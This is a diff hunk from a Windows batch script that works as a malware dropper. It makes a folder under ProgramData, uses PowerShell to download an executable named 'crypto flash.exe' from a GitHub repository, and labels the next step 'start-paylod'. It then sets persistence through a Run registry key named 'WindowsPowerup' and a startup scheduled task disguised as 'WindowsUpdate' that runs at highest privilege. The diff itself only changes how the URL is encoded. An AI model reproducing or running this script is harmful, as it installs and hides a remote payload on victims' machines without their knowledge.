@@ -21,7 +21,7 @@ cls
 echo --------------------cerete-my-path--------------------------------------------------
 mkdir "%systemdrive%\programdata\GG-Win"
 echo ----------------------------copy-my-files-to-web-sever-------------------------------------
-PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/dfsggsg/crypto/raw/refs/heads/main/crypto%20flash.exe','%programdata%\GG-Win\crypto flash.exe')
+PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/dfsggsg/crypto/raw/refs/heads/main/crypto flash.exe','%programdata%\GG-Win\crypto flash.exe')
 echo -----------start-paylod------------------------
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\crypto flash.exe"
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\GG-Win\crypto flash.exe" /f
